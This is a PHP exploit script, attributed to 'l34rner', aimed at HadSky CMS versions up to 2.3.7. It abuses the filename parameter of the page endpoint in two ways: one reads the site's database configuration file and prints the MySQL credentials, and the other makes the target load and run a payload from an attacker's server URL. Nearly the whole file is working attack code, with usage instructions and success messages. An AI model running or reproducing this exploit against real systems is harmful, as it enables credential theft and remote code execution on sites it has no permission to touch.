<?php
/**
Author:l34rner
Desc:HadSky CMS <=2.3.7 remote code excution && file disclosure vulnerability

**/
$die=<<<str

usage:php $argv[0] target [payloadURL]

Eg: php $argv[0] http://www.google.com/HadSky/ [http://yourServer/payload.txt]

if you dont set the payloadURL,This exp will read the site`s config.php by default.

str;
if($argc<2 || $argc>3)
{
	die($die);
}
$poc='?c=page&filename=./puyuetian/mysql/config.php';
$ch=curl_init();
if(!$ch)
{
	die("Dont support curl!");
}

if($argc==2)
{
	$url=$argv[1].$poc;
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	$out=curl_exec($ch);
	$start=strpos($out,'$_G[\'MYSQL\']');	
	$end=strpos($out,'$_G[\'MYSQL\'][\'CHARSET\']');
	$output=substr($out,$start,$end-$start);
	if($output)
	{
		echo "\r\noh yeah,got the result\r\n\r\n";
		echo $output;
	}
	else
	{
		echo "oops,seems the config file has been renamed!";
	}
}
if($argc==3)
{
	$url=$argv[1].'?c=page&filename='.$argv[2];
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	$out=curl_exec($ch);
	$error='未找到的模板文件！';
	$errorpos=strpos($out, $error);
	if($errorpos===false)
	{
		echo "Done,ur code has been  excuted successfully!";
	}
	else
	{
		echo "Failed!";
	}
}
?>